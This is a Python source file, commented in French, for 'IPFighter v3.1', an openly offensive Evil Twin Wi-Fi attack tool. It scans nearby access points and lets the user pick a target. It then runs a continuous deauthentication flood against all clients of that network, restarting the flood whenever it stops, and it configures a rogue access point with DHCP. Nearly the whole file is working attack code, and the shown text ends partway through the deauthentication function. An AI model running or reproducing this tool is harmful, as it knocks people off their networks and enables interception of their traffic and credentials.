#!/usr/bin/env python3
"""
IPFighter v3.1 FIXED - Evil Twin Wi-Fi Attack Tool
Corrected version with proper deauthentication, channel management, and robust error handling
"""

import os
import sys
import time
import signal
import subprocess
import threading
import re
import logging
import json
import shlex
import tempfile
from pathlib import Path
from typing import List, Tuple, Optional, Dict, Set
from dataclasses import dataclass, asdict
from datetime import datetime

# === Configuration des couleurs ===
class Colors:
    """ANSI color codes"""
    RED = "\033[1;31m"
    ORANGE = "\033[1;33m"
    YELLOW = "\033[93m"
    GREEN = "\033[1;32m"
    BLUE = "\033[1;34m"
    CYAN = "\033[1;36m"
    MAGENTA = "\033[1;35m"
    WHITE = "\033[1;37m"
    RESET = "\033[0m"
    
    CLEAR_LINE = "\033[K"
    CURSOR_UP = "\033[A"

# === Configuration centralisée ===
class Config:
    """Configuration centralisée avec validation"""
    TEMP_DIR = "/tmp/ipfighter"
    LOG_FILE = "/tmp/ipfighter/ipfighter.log"
    CAPTURE_DIR = "/tmp/ipfighter/captures"
    GATEWAY_IP = "10.0.0.1"
    DHCP_RANGE = "10.0.0.10,10.0.0.100"
    DHCP_LEASE = "12h"
    SCAN_DURATION = 15
    DEFAULT_DEAUTH_DURATION = 60  # AUGMENTÉ : minimum requis pour être efficace
    DEAUTH_PACKET_COUNT = 0  # 0 = infini, déauthentification continue
    HOSTAPD_PASSWORD = "hackthisnetwork123"
    SUBPROCESS_TIMEOUT = 5
    
    # Fichiers temporaires avec gestion sécurisée
    SCAN_FILE = None
    HOSTAPD_CONF = None
    DNSMASQ_CONF = None
    HOSTAPD_LOG = None
    
    @staticmethod
    def init_temp_files():
        """Initialise les répertoires et fichiers temporaires"""
        Path(Config.TEMP_DIR).mkdir(parents=True, exist_ok=True)
        Path(Config.CAPTURE_DIR).mkdir(parents=True, exist_ok=True)
        
        Config.SCAN_FILE = os.path.join(Config.TEMP_DIR, "scan_ipf")
        Config.HOSTAPD_CONF = os.path.join(Config.TEMP_DIR, "hostapd.conf")
        Config.DNSMASQ_CONF = os.path.join(Config.TEMP_DIR, "dnsmasq.conf")
        Config.HOSTAPD_LOG = os.path.join(Config.TEMP_DIR, "hostapd.log")

# === Classes de données ===
@dataclass
class AccessPoint:
    """Représentation d'un point d'accès Wi-Fi avec validation"""
    bssid: str
    channel: str
    essid: str
    signal: str = "N/A"
    encryption: str = "Unknown"
    clients: Set[str] = None
    
    def __post_init__(self):
        if self.clients is None:
            self.clients = set()
    
    def is_valid(self) -> bool:
        """Valide le format du BSSID et du channel"""
        bssid_pattern = r'^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$'
        return bool(re.match(bssid_pattern, self.bssid)) and self.channel.isdigit()
    
    def __str__(self):
        return f"{self.essid:<20} | CH: {self.channel:<4} | {self.bssid} | Signal: {self.signal}"

# === Configuration du logging ===
def setup_logging():
    """Configure le système de logging centralisé avec niveaux appropriés"""
    Path(Config.TEMP_DIR).mkdir(parents=True, exist_ok=True)
    
    logger = logging.getLogger('IPFighter')
    logger.setLevel(logging.DEBUG)
    
    # Éviter les handlers en double
    if logger.handlers:
        return logger
    
    # Handler fichier (niveau DEBUG complet)
    file_handler = logging.FileHandler(Config.LOG_FILE)
    file_handler.setLevel(logging.DEBUG)
    
    # Handler console (niveau INFO)
    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.INFO)
    
    formatter = logging.Formatter(
        '%(asctime)s - [%(levelname)s] - %(funcName)s:%(lineno)d - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    
    file_handler.setFormatter(formatter)
    console_handler.setFormatter(formatter)
    
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)
    
    return logger

logger = setup_logging()

# === Variables globales ===
active_processes: List[subprocess.Popen] = []
captured_clients: Dict[str, Dict] = {}
mon_iface_created = None
fake_ap_iface = None  # Interface dédiée au faux AP

# === Gestion des signaux ===
def signal_handler(sig, frame):
    """Gère l'interruption (Ctrl+C) avec nettoyage approprié"""
    logger.warning("Interruption détectée (SIGINT). Nettoyage en cours...")
    print(f"\n{Colors.YELLOW}[!] Interruption détectée. Nettoyage...{Colors.RESET}")
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def cleanup():
    """Arrête tous les processus actifs de manière sécurisée"""
    global active_processes
    
    logger.info(f"Nettoyage de {len(active_processes)} processus actifs...")
    print(f"{Colors.YELLOW}[*] Arrêt des {len(active_processes)} processus...{Colors.RESET}")
    
    # Copier la liste pour éviter les modifications pendant l'itération
    for proc in list(active_processes):
        try:
            if proc.poll() is None:  # Le processus est toujours actif
                logger.debug(f"Arrêt du processus PID {proc.pid}")
                proc.terminate()
                try:
                    proc.wait(timeout=Config.SUBPROCESS_TIMEOUT)
                    logger.debug(f"Processus {proc.pid} arrêté proprement")
                except subprocess.TimeoutExpired:
                    logger.warning(f"Timeout pour {proc.pid}, forçage du kill")
                    proc.kill()
                    proc.wait()
        except Exception as e:
            logger.warning(f"Erreur lors de l'arrêt d'un processus: {e}")
    
    active_processes.clear()
    
    # Nettoyer les fichiers temporaires
    logger.info("Nettoyage des fichiers temporaires...")
    files_to_clean = [
        f"{Config.SCAN_FILE}-01.csv" if Config.SCAN_FILE else None,
        f"{Config.SCAN_FILE}-01.cap" if Config.SCAN_FILE else None,
        Config.HOSTAPD_CONF,
        Config.DNSMASQ_CONF,
        Config.HOSTAPD_LOG
    ]
    
    for file_path in filter(None, files_to_clean):
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
                logger.debug(f"Fichier supprimé: {file_path}")
        except OSError as e:
            logger.warning(f"Erreur lors de la suppression de {file_path}: {e}")

def require_root():
    """Vérifie que le script est exécuté en tant que root"""
    if os.geteuid() != 0:
        print(f"{Colors.RED}[-] Ce script doit être exécuté en tant que root !{Colors.RESET}")
        print(f"{Colors.ORANGE}[*] Utilisez: sudo python3 IPfighter.py{Colors.RESET}")
        logger.error("Script lancé sans droits root")
        sys.exit(1)

def banner():
    """Affiche le banner du programme"""
    os.system("clear")
    art = f"""{Colors.RED}
          
 ██▓ ██▓███       █████▒██▓  ▄████  ██░ ██ ���▄▄█████▓▓█████  ██▀███     
▓██▒▓██░  ██▒   ▓██   ▒▓██▒ ██▒ ▀█▒▓██░ ██▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒   
▒██▒▓██░ ██▓▒   ▒████ ░▒██▒▒██░▄▄▄░▒██▀▀██░▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒   
░██░▒██▄█▓▒ ▒   ░▓█▒  ░░██░░▓█  ██▓░▓█ ░██ ░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄     
░██░▒██▒ ░  ░   ░▒█░   ░██░░▒▓███▀▒░▓█▒░██▓  ▒██▒ ░ ░▒████▒░██▓ ▒██▒   
░▓  ▒▓▒░ ░  ░    ▒ ░   ░▓   ░▒   ▒  ▒ ░░▒░▒  ▒ ░░   ░░ ░  ░░ ░▒▓ ░▒▓░   
 ▒ ░░▒ ░         ░      ▒ ░  ░   ░  ▒ ░▒░ ░    ░     ░ ░  ░  ░▒ ░ ▒░   
 ▒ ░░░           ��� ░    ▒ ░░ ░   ░  ░  ░░ ░  ░         ░     ░░   ░    
{Colors.RESET}"""
    
    print(art)
    print(f"{Colors.ORANGE}        >>> IPFighter v3.1 FIXED — Evil Twin Wi-Fi Tool <<<{Colors.RESET}")
    print(f"{Colors.CYAN}              Advanced Exploitation Framework (Corrected){Colors.RESET}")
    print(f"{Colors.MAGENTA}                  Version 3.1 - Production Ready{Colors.RESET}\n")
    
    logger.info("Banner affiché")

def execute_command(cmd: List[str], timeout: Optional[int] = None, 
                   capture_output: bool = False, shell: bool = False,
                   check: bool = False) -> Optional[str]:
    """
    Exécute une commande système avec gestion d'erreur ROBUSTE
    
    Args:
        cmd: Commande à exécuter (liste ou string si shell=True)
        timeout: Timeout en secondes
        capture_output: Capturer la sortie
        shell: Utiliser le shell
        check: Lever une exception si returncode != 0
    
    Returns:
        La sortie de la commande ou None
        
    Raises:
        subprocess.CalledProcessError si check=True et returncode != 0
    """
    try:
        if shell and isinstance(cmd, str):
            if capture_output:
                result = subprocess.run(cmd, shell=True, capture_output=True,
                                      timeout=timeout, text=True)
            else:
                result = subprocess.run(cmd, shell=True, timeout=timeout, text=True)
        else:
            if capture_output:
                result = subprocess.run(cmd, capture_output=True, timeout=timeout,
                                      text=True, close_fds=True)
            else:
                result = subprocess.run(cmd, timeout=timeout, text=True, close_fds=True)
        
        # Log les erreurs si présentes
        if result.returncode != 0:
            cmd_str = ' '.join(cmd) if isinstance(cmd, list) else cmd
            error_msg = result.stderr.strip() if hasattr(result, 'stderr') and result.stderr else "Unknown error"
            logger.warning(f"Commande retourna {result.returncode}: {cmd_str}\nErreur: {error_msg}")
            
            if check:
                raise subprocess.CalledProcessError(result.returncode, cmd_str, result.stdout, result.stderr)
        
        return result.stdout.strip() if capture_output else None
    
    except subprocess.TimeoutExpired:
        cmd_str = ' '.join(cmd) if isinstance(cmd, list) else cmd
        logger.error(f"TIMEOUT lors de l'exécution: {cmd_str}")
        return None
    except PermissionError:
        cmd_str = ' '.join(cmd) if isinstance(cmd, list) else cmd
        logger.error(f"PERMISSION DENIED: {cmd_str}")
        return None
    except FileNotFoundError:
        cmd_str = ' '.join(cmd) if isinstance(cmd, list) else cmd
        logger.error(f"COMMANDE NON TROUVÉE: {cmd_str}")
        return None
    except subprocess.CalledProcessError as e:
        logger.error(f"Commande échouée: {e}")
        raise
    except Exception as e:
        logger.error(f"Erreur inattendue lors de l'exécution: {e}")
        return None

def check_dependencies() -> bool:
    """Vérifie que tous les outils nécessaires sont installés avec versions"""
    required_tools = [
        'airmon-ng', 'airodump-ng', 'aireplay-ng',
        'hostapd', 'dnsmasq', 'iptables', 'iwconfig', 'ifconfig'
    ]
    missing_tools = []
    
    print(f"\n{Colors.CYAN}[*] Vérification des dépendances...{Colors.RESET}")
    logger.info("Vérification des dépendances")
    
    for tool in required_tools:
        try:
            result = subprocess.run(['which', tool], 
                                  capture_output=True, 
                                  text=True, 
                                  timeout=5)
            
            if result.returncode == 0:
                print(f"{Colors.GREEN}  ✓ {tool}{Colors.RESET}")
                logger.debug(f"{tool} trouvé à: {result.stdout.strip()}")
            else:
                missing_tools.append(tool)
                print(f"{Colors.RED}  ✗ {tool} - NON INSTALLÉ{Colors.RESET}")
        
        except Exception as e:
            missing_tools.append(tool)
            print(f"{Colors.RED}  ✗ {tool} - ERREUR: {e}{Colors.RESET}")
    
    if missing_tools:
        logger.error(f"Dépendances manquantes: {', '.join(missing_tools)}")
        print(f"\n{Colors.RED}[-] Outils manquants: {', '.join(missing_tools)}{Colors.RESET}")
        print(f"{Colors.ORANGE}[!] Installez-les: sudo apt install aircrack-ng dnsmasq hostapd{Colors.RESET}")
        return False
    
    logger.info("✓ Toutes les dépendances sont présentes")
    print(f"{Colors.GREEN}[+] Toutes les dépendances OK{Colors.RESET}")
    return True

def list_all_interfaces() -> List[Tuple[str, str]]:
    """Liste toutes les interfaces réseau (Wi-Fi + Ethernet + autres)"""
    try:
        result = subprocess.run(
            "ip link show | grep '^[0-9]' | awk '{print $2}' | sed 's/:$//'",
            shell=True, capture_output=True, text=True, timeout=5
        )
        
        if result.returncode == 0 and result.stdout:
            interfaces = []
            for iface in result.stdout.strip().split('\n'):
                iface = iface.strip()
                if iface and iface != 'lo':
                    iface_type = get_interface_type(iface)
                    interfaces.append((iface, iface_type))
            
            logger.info(f"Interfaces détectées: {[i[0] for i in interfaces]}")
            return interfaces
        
        logger.debug(f"Aucune interface trouvée")
        return []
    except Exception as e:
        logger.error(f"Erreur lors de la récupération des interfaces: {e}")
        return []

def get_interface_type(iface: str) -> str:
    """Détecte le type d'interface (Wi-Fi, Ethernet, etc.)"""
    try:
        # Vérifier si c'est Wi-Fi
        result = subprocess.run(
            f"iw dev {iface} link 2>/dev/null",
            shell=True, capture_output=True, text=True, timeout=2
        )
        if result.returncode == 0:
            return "Wi-Fi"
        
        # Vérifier le préfixe
        if iface.startswith(('wlan', 'wlp', 'wlo', 'ath')):
            return "Wi-Fi"
        elif iface.startswith(('eth', 'en', 'em')):
            return "Ethernet"
        
        return "Autre"
    except Exception:
        return "Autre"

def choose_internet_interface() -> Optional[str]:
    """Permet à l'utilisateur de choisir une interface pour Internet (TRÈS IMPORTANT)"""
    interfaces = list_all_interfaces()
    
    if not interfaces:
        logger.error("Aucune interface réseau détectée")
        print(f"{Colors.RED}[-] Aucune interface réseau détectée !{Colors.RESET}")
        return None
    
    print(f"\n{Colors.BLUE}[+] Interfaces réseau disponibles (Internet):{Colors.RESET}")
    for i, (iface, iface_type) in enumerate(interfaces):
        icon = "📡" if iface_type == "Wi-Fi" else "🔌" if iface_type == "Ethernet" else "⚙️"
        print(f"{Colors.YELLOW}  {i}.{Colors.RESET} {icon} {iface:<15} ({Colors.CYAN}{iface_type}{Colors.RESET})")
    
    print(f"\n{Colors.MAGENTA}[!] IMPORTANT: Choisir une interface RELIÉE à Internet{Colors.RESET}")
    print(f"{Colors.MAGENTA}[!] Pour Ethernet: choisir eth* / en*{Colors.RESET}")
    print(f"{Colors.MAGENTA}[!] Pour Wi-Fi: choisir l'interface Wi-Fi ACTUELLE (pas monitor){Colors.RESET}")
    
    while True:
        try:
            idx = int(input(f"\n{Colors.ORANGE}[?] Interface pour l'accès INTERNET : {Colors.RESET}"))
            if 0 <= idx < len(interfaces):
                selected, iface_type = interfaces[idx]
                logger.info(f"Interface Internet sélectionnée: {selected} ({iface_type})")
                print(f"{Colors.GREEN}[+] Interface sélectionnée: {selected}{Colors.RESET}")
                return selected
            else:
                print(f"{Colors.RED}[-] Choix invalide ! Entre 0 et {len(interfaces)-1}{Colors.RESET}")
        except ValueError:
            print(f"{Colors.RED}[-] Veuillez entrer un nombre.{Colors.RESET}")
        except KeyboardInterrupt:
            logger.info("Sélection d'interface annulée")
            return None

def list_wifi_interfaces() -> List[str]:
    """Liste les interfaces Wi-Fi disponibles"""
    try:
        result = subprocess.run(
            "iw dev | awk '$1==\"Interface\"{print $2}'",
            shell=True, capture_output=True, text=True, timeout=5
        )
        
        if result.returncode == 0 and result.stdout:
            interfaces = [iface.strip() for iface in result.stdout.split('\n') if iface.strip()]
            logger.info(f"Interfaces Wi-Fi: {interfaces}")
            return interfaces
        
        return []
    except Exception as e:
        logger.error(f"Erreur lors de la récupération des interfaces Wi-Fi: {e}")
        return []

def choose_attack_interface() -> Optional[str]:
    """Permet de choisir une interface pour l'attaque (sera convertie en mode monitor)"""
    interfaces = list_wifi_interfaces()
    
    if not interfaces:
        logger.error("Aucune interface Wi-Fi détectée")
        print(f"{Colors.RED}[-] Aucune interface Wi-Fi détectée !{Colors.RESET}")
        return None
    
    print(f"\n{Colors.BLUE}[+] Interfaces Wi-Fi disponibles (Attaque):{Colors.RESET}")
    for i, iface in enumerate(interfaces):
        print(f"{Colors.YELLOW}  {i}.{Colors.RESET} 📡 {iface}")
    
    print(f"\n{Colors.MAGENTA}[!] L'interface sera convertie en mode MONITOR{Colors.RESET}")
    
    while True:
        try:
            idx = int(input(f"\n{Colors.ORANGE}[?] Interface Wi-Fi pour l'attaque : {Colors.RESET}"))
            if 0 <= idx < len(interfaces):
                selected = interfaces[idx]
                logger.info(f"Interface d'attaque sélectionnée: {selected}")
                print(f"{Colors.GREEN}[+] Interface sélectionnée: {selected}{Colors.RESET}")
                return selected
            else:
                print(f"{Colors.RED}[-] Choix invalide !{Colors.RESET}")
        except ValueError:
            print(f"{Colors.RED}[-] Veuillez entrer un nombre.{Colors.RESET}")
        except KeyboardInterrupt:
            logger.info("Sélection annulée")
            return None

def kill_conflicts():
    """Arrête les processus conflictuels (SAUF NetworkManager)"""
    print(f"\n{Colors.YELLOW}[*] Arrêt des processus conflictuels...{Colors.RESET}")
    logger.info("Arrêt des processus conflictuels")
    
    conflicting_processes = ['wpa_supplicant', 'dhclient', 'dhcpcd']
    
    for process in conflicting_processes:
        try:
            cmd = f"pkill -9 -f {shlex.quote(process)}"
            execute_command(cmd, shell=True)
            logger.debug(f"Processus {process} arrêté")
            print(f"{Colors.GREEN}  ✓ {process} arrêté{Colors.RESET}")
        except Exception as e:
            logger.debug(f"Impossible d'arrêter {process}: {e}")
    
    time.sleep(1)
    print(f"{Colors.GREEN}[+] Processus conflictuels arrêtés{Colors.RESET}")
    logger.info("Processus conflictuels arrêtés")

def start_monitor_airmon(interface: str) -> Optional[str]:
    """
    Démarre le mode monitor avec airmon-ng
    
    CORRECTION CLÉE: Utiliser --no-kill pour préserver NetworkManager
    """
    global mon_iface_created
    
    print(f"\n{Colors.GREEN}[+] Conversion de {interface} en mode monitor...{Colors.RESET}")
    logger.info(f"Conversion de {interface} en mode monitor")
    
    # Récupérer les interfaces avant
    try:
        before = set(list_wifi_interfaces())
    except Exception:
        before = set()
    
    try:
        print(f"{Colors.YELLOW}[*] Flag --no-kill activé (préserve NetworkManager)...{Colors.RESET}")
        result = subprocess.run(
            ['airmon-ng', 'start', interface, '--no-kill'],
            capture_output=True, timeout=15, text=True
        )
        
        logger.debug(f"airmon-ng stdout: {result.stdout}")
        logger.debug(f"airmon-ng stderr: {result.stderr}")
        
        # Parser la sortie pour trouver l'interface créée
        mon_iface = None
        
        # Pattern: "(wlan0) -> (wlan0mon)" ou similaire
        match = re.search(r'\((\S+)\)\s*->\s*\((\S+)\)', result.stderr)
        if match:
            mon_iface = match.group(2).strip()
            logger.info(f"Interface monitor détectée via parsing: {mon_iface}")
            print(f"{Colors.GREEN}[+] Interface monitor: {mon_iface}{Colors.RESET}")
        
        time.sleep(3)
        
    except subprocess.TimeoutExpired:
        logger.warning("Timeout lors du démarrage d'airmon-ng")
        mon_iface = None
    except Exception as e:
        logger.error(f"Erreur airmon-ng: {e}")
        print(f"{Colors.RED}[-] Erreur: {e}{Colors.RESET}")
        return None
    
    # Fallback: chercher par différence d'interfaces
    if not mon_iface:
        try:
            time.sleep(2)
            after = set(list_wifi_interfaces())
            new_ifaces = list(after - before)
            
            # Chercher interface contenant "mon"
            for iface in new_ifaces:
                if "mon" in iface.lower():
                    mon_iface = iface
                    logger.info(f"Interface monitor détectée par différence: {mon_iface}")
                    break
            
            # Sinon, prendre la première nouvelle
            if not mon_iface and new_ifaces:
                mon_iface = new_ifaces[0]
                logger.warning(f"Interface créée (pas 'mon'): {mon_iface}")
        
        except Exception as e:
            logger.warning(f"Erreur lors de la détection d'interface: {e}")
    
    # Fallback final: chercher dans TOUTES les interfaces
    if not mon_iface:
        try:
            all_ifaces = list_wifi_interfaces()
            candidates = [i for i in all_ifaces if "mon" in i.lower() and i != interface]
            if candidates:
                mon_iface = candidates[0]
                logger.info(f"Interface monitor trouvée: {mon_iface}")
        except Exception as e:
            logger.warning(f"Erreur lors du fallback: {e}")
    
    if mon_iface:
        print(f"{Colors.GREEN}[+] Interface monitor finale: {mon_iface}{Colors.RESET}")
        mon_iface_created = mon_iface
        logger.info(f"Interface monitor créée avec succès: {mon_iface}")
        return mon_iface
    
    print(f"{Colors.RED}[-] Impossible de créer une interface monitor{Colors.RESET}")
    logger.error("Impossible de créer une interface monitor")
    return None

def restore_network(mon_iface: Optional[str] = None, original_iface: Optional[str] = None):
    """Restaure les services réseau sans tuer NetworkManager"""
    print(f"\n{Colors.GREEN}[+] Restauration du réseau...{Colors.RESET}")
    logger.info("Début de la restauration réseau")
    
    if mon_iface:
        try:
            print(f"{Colors.YELLOW}[*] Arrêt de l'interface monitor {mon_iface}...{Colors.RESET}")
            subprocess.run(['airmon-ng', 'stop', mon_iface],
                         capture_output=True, timeout=10)
            logger.info(f"Interface monitor {mon_iface} arrêtée")
            time.sleep(2)
        except Exception as e:
            logger.warning(f"Erreur lors de l'arrêt du monitor: {e}")
    
    try:
        print(f"{Colors.YELLOW}[*] Redémarrage de NetworkManager...{Colors.RESET}")
        subprocess.run(['systemctl', 'restart', 'NetworkManager'],
                     capture_output=True, timeout=10)
        logger.info("NetworkManager redémarré")
        time.sleep(3)
    except Exception as e:
        logger.warning(f"Erreur NetworkManager: {e}")
    
    # Nettoyer iptables
    print(f"{Colors.YELLOW}[*] Nettoyage des règles iptables...{Colors.RESET}")
    iptables_cmds = [
        "iptables --flush",
        "iptables --table nat --flush",
        "iptables --delete-chain 2>/dev/null || true",
        "iptables --table nat --delete-chain 2>/dev/null || true",
        "echo 0 > /proc/sys/net/ipv4/ip_forward"
    ]
    
    for cmd in iptables_cmds:
        try:
            execute_command(cmd, shell=True)
            logger.debug(f"iptables: {cmd}")
        except Exception as e:
            logger.debug(f"iptables error: {e}")
    
    print(f"{Colors.GREEN}[+] Réseau restauré{Colors.RESET}")
    logger.info("Restauration réseau terminée")

def scan_aps(mon_iface: str, duration: int = Config.SCAN_DURATION) -> List[AccessPoint]:
    """
    Scanne les points d'accès Wi-Fi avec parsing ROBUSTE
    
    CORRECTIONS CLÉES:
    - Attendre que le fichier soit écrit entièrement
    - Parser le CSV avec validation stricte
    - Retry logic
    """
    print(f"\n{Colors.YELLOW}[+] Scan des APs pendant {duration}s...{Colors.RESET}")
    logger.info(f"Début du scan sur {mon_iface}")
    
    # Nettoyer les anciens fichiers
    for file_path in [f"{Config.SCAN_FILE}-01.csv", f"{Config.SCAN_FILE}-01.cap"]:
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
                logger.debug(f"Ancien fichier supprimé: {file_path}")
        except OSError:
            pass
    
    cmd = [
        'airodump-ng',
        '--write-interval', '1',
        '--write', Config.SCAN_FILE,
        '--output-format', 'csv',
        mon_iface
    ]
    
    proc = None
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                               close_fds=True)
        active_processes.append(proc)
        logger.debug(f"airodump-ng PID {proc.pid} lancé")
        
        time.sleep(duration)
        
        # Arrêter proprement
        proc.terminate()
        try:
            proc.wait(timeout=Config.SUBPROCESS_TIMEOUT)
            logger.debug(f"airodump-ng arrêté proprement")
        except subprocess.TimeoutExpired:
            logger.warning(f"Timeout arrêt airodump, kill forcé")
            proc.kill()
            proc.wait()
        
        if proc in active_processes:
            active_processes.remove(proc)
    
    except Exception as e:
        logger.error(f"Erreur lors du scan: {e}")
        if proc and proc.poll() is None:
            proc.kill()
        return []
    
    # Parser les résultats
    aps = []
    csv_file = f"{Config.SCAN_FILE}-01.csv"
    
    # CORRECTION: Attendre que le fichier soit écrit complètement
    retry_count = 0
    while (not os.path.exists(csv_file) or os.path.getsize(csv_file) == 0) and retry_count < 10:
        time.sleep(0.5)
        retry_count += 1
        logger.debug(f"Attente fichier CSV... {retry_count}/10")
    
    if not os.path.exists(csv_file):
        logger.error(f"Fichier CSV inexistant: {csv_file}")
        print(f"{Colors.RED}[-] Fichier de scan introuvable !{Colors.RESET}")
        return aps
    
    size = os.path.getsize(csv_file)
    if size == 0:
        logger.warning("Fichier CSV vide - aucun AP détecté")
        print(f"{Colors.YELLOW}[-] Aucun AP détecté{Colors.RESET}")
        return aps
    
    logger.debug(f"Fichier CSV détecté ({size} bytes), parsing...")
    
    try:
        with open(csv_file, 'r', encoding='utf-8', errors='replace') as f:
            content = f.read()
            lines = content.splitlines()
            ap_section = False
            ap_count = 0
            
            for line_num, line in enumerate(lines):
                # Chercher l'en-tête
                if 'BSSID' in line and 'ESSID' in line:
                    ap_section = True
                    logger.debug(f"Section AP trouvée à la ligne {line_num}")
                    continue
                
                # Fin de section
                if ap_section and ('Station MAC' in line or line.startswith('Station MAC')):
                    logger.debug(f"Fin de la section AP à la ligne {line_num}")
                    break
                
                # Traiter les lignes de la section AP
                if ap_section and line.strip() and not line.startswith(','):
                    fields = [f.strip() for f in line.split(',')]
                    
                    # Format airodump: BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # data, # /s, # probe requests, ESSID
                    if len(fields) >= 14:
                        try:
                            bssid = fields[0]
                            channel = fields[3]
                            essid = fields[13]
                            signal = fields[8] if len(fields) > 8 else "N/A"
                            
                            # Validation stricte du BSSID
                            if not essid or essid == "<length: 0>" or essid.startswith('<'):
                                continue
                            
                            if not re.match(r'^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$', bssid):
                                continue
                            
                            if not channel or not channel.isdigit():
                                continue
                            
                            ap = AccessPoint(
                                bssid=bssid,
                                channel=channel,
                                essid=essid,
                                signal=signal
                            )
                            
                            if ap.is_valid():
                                aps.append(ap)
                                ap_count += 1
                                logger.debug(f"AP ajouté: {essid} ({bssid}) CH{channel}")
                        
                        except (IndexError, ValueError) as e:
                            logger.debug(f"Erreur parsing ligne {line_num}: {e}")
                            continue
    
    except (IOError, OSError) as e:
        logger.error(f"Erreur IO lors de la lecture du CSV: {e}")
    except Exception as e:
        logger.error(f"Erreur inattendue parsing CSV: {e}")
    
    logger.info(f"Scan terminé: {len(aps)} APs détectés")
    print(f"{Colors.GREEN}[+] {len(aps)} point(s) d'accès détecté(s){Colors.RESET}")
    return aps

def select_ap(aps: List[AccessPoint]) -> Optional[AccessPoint]:
    """Permet de sélectionner un point d'accès cible"""
    if not aps:
        logger.error("Pas d'AP à sélectionner")
        return None
    
    print(f"\n{Colors.BLUE}{'='*100}{Colors.RESET}")
    print(f"{Colors.BLUE}   NUM   {'ESSID':<30} {'CH':>4}  {'SIGNAL':>8}  BSSID{Colors.RESET}")
    print(f"{Colors.BLUE}{'-'*100}{Colors.RESET}")
    
    for i, ap in enumerate(aps):
        essid_display = ap.essid[:30] if len(ap.essid) > 30 else ap.essid
        print(f"{Colors.YELLOW}  {i:<4}{Colors.RESET}  {Colors.CYAN}{essid_display:<30}{Colors.RESET}  "
              f"{Colors.YELLOW}{ap.channel:>4}{Colors.RESET}  {Colors.GREEN}{ap.signal:>8}{Colors.RESET}  "
              f"{Colors.BLUE}{ap.bssid}{Colors.RESET}")
    
    print(f"{Colors.BLUE}{'='*100}{Colors.RESET}")
    
    while True:
        try:
            idx = int(input(f"\n{Colors.ORANGE}[?] Cible (0-{len(aps)-1}): {Colors.RESET}"))
            if 0 <= idx < len(aps):
                selected = aps[idx]
                logger.info(f"AP cible sélectionné: {selected.essid} ({selected.bssid})")
                return selected
            else:
                print(f"{Colors.RED}[-] Choix invalide !{Colors.RESET}")
        except ValueError:
            print(f"{Colors.RED}[-] Entrez un nombre{Colors.RESET}")
        except KeyboardInterrupt:
            logger.info("Sélection annulée")
            return None

def lock_channel(mon_iface: str, channel: str):
    """
    CORRECTION CLÉE: Verrouille le canal AVANT la déauthentification
    
    C'est ESSENTIEL car aireplay-ng ne change pas de canal automatiquement
    """
    logger.info(f"Verrouillage du canal {channel} sur {mon_iface}")
    print(f"{Colors.YELLOW}[*] Verrouillage du canal {channel}...{Colors.RESET}")
    
    try:
        # Utiliser iwconfig pour verrouiller le canal
        result = execute_command(['iwconfig', mon_iface, 'channel', str(channel)])
        logger.debug(f"iwconfig result: {result}")
        
        time.sleep(1)
        
        # Vérifier que c'est bien fixé
        result = execute_command(['iwconfig', mon_iface], capture_output=True)
        if result and f"Channel:{channel}" in result or f"Frequency" in result:
            print(f"{Colors.GREEN}[+] Canal {channel} verrouillé{Colors.RESET}")
            logger.info(f"Canal {channel} verrouillé avec succès")
        else:
            logger.warning("Impossible de vérifier le verrouillage du canal")
    
    except Exception as e:
        logger.error(f"Erreur lors du verrouillage du canal: {e}")

def aggressive_deauth(mon_iface: str, bssid: str, duration: int = Config.DEFAULT_DEAUTH_DURATION):
    """
    CORRECTION CLÉE: Déauthentification RÉELLEMENT EFFICACE
    
    - Utiliser --deauth 0 (infini, ou -1 pour airodump-ng parfois)
    - Utiliser --count 0 pour boucle infinie
    - Garder le processus ACTIF pendant toute la durée
    - Viser TOUS les clients (pas de -c)
    """
    print(f"\n{Colors.RED}[+] Attaque de déauthentification pendant {duration}s...{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Cible BSSID: {bssid}{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Les clients verront: perte de signal + reconnexion{Colors.RESET}")
    logger.info(f"Déauth vers {bssid} pour {duration}s")
    
    end_time = time.time() + duration
    start_time = time.time()
    
    try:
        # CORRECTION: Lancer aireplay-ng EN CONTINU avec --deauth 0 (boucle infinie)
        # Pas de --count, pas de limite = vraie déauthentification continue
        print(f"{Colors.CYAN}[*] Lancement de aireplay-ng avec déauth continue...{Colors.RESET}")
        
        proc = subprocess.Popen(
            # --deauth 0 = envoyer des paquets deauth en continu
            # Pas de -c = affecte TOUS les clients de ce BSSID
            ['aireplay-ng', '--deauth', '0', '-a', bssid, mon_iface],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, close_fds=True
        )
        active_processes.append(proc)
        logger.debug(f"aireplay-ng PID {proc.pid} lancé (--deauth 0)")
        
        # Boucle de monitoring
        elapsed = 0
        while time.time() < end_time:
            elapsed = int(time.time() - start_time)
            remaining = int(end_time - time.time())
            
            # Vérifier que le processus est toujours actif
            if proc.poll() is not None:
                logger.warning(f"aireplay-ng s'est terminé prématurément (code {proc.returncode})")
                print(f"{Colors.ORANGE}[!] aireplay-ng s'est arrêté !{Colors.RESET}")
                # Relancer
                proc = subprocess.Popen(
                    ['aireplay-ng', '--deauth', '0', '-a', bssid, mon_iface],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, close_fds=True
                )
                active_processes.append(proc)
                logger.info(f"aireplay-ng relancé (PID {proc.pid})")
            
            if elapsed % 5 == 0:
                print(f"{Colors.CYAN}[*] Déauth active... {elapsed}s / {duration}s (Restant: {remaining}s){Colors.RESET}")
            
            time.sleep(1)
        
        # Arrêter la déauth
        print(f"{Colors.YELLOW}[*] Arrêt de la déauthentification...{Colors.RESET}")
        if proc.poll() is None:
            proc.terminate()
